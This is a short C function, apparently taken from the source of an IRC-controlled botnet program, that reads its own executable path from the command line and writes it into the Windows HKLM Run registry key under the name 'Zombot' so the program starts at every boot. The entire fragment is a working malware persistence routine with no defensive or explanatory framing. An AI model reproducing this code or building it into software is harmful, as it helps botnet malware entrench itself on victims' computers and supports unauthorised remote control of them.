
void install()
{
  irc_parsestr(GetCommandLine());
  if (strv[0][0]=='"')
  {
    strv[0]++;
    strv[0][strlen(strv[0])-1]=0;
  }
  HKEY hKey;
  RegOpenKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
  RegSetValueEx(hKey, "Zombot", 0, REG_SZ, strv[0], strlen(strv[0])+1);
  RegCloseKey(hKey);
}

